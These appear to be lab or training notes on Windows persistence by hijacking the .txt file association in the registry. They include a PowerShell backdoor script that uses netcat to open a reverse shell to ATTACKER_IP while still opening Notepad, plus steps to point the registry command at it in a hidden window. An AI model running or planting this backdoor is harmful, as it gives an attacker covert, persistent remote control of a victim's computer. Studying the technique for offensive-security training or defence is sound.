# Hijacking File Associations

* In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.
* The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`.
* Let's say we want to check which program is used to open `.txt` files; we can just go and check for the `.txt` subkey and find which Programmatic ID (ProgID) is associated with it.
* A ProgID is simply an identifier to a program installed on the system. For `.txt` files, we will have the following ProgID:

![](https://user-images.githubusercontent.com/75596877/181037600-661af9c6-11f2-4b88-91b2-238a657efd50.png)

* We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling `.txt` files.
* Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

![](https://user-images.githubusercontent.com/75596877/181037767-91b105ec-1938-4dec-a505-62147686dba3.png)

* In this case, when you try to open a `.txt` file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. - If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual.
* First, let's create a `ps1` script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

* Now let's change the registry key to run our backdoor script in a hidden window:

![](https://user-images.githubusercontent.com/75596877/181038151-d8282131-c87d-4bde-881b-9e804ebd7daf.png)

* Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed).
* You should receive a reverse shell with the privileges of the user opening the file.
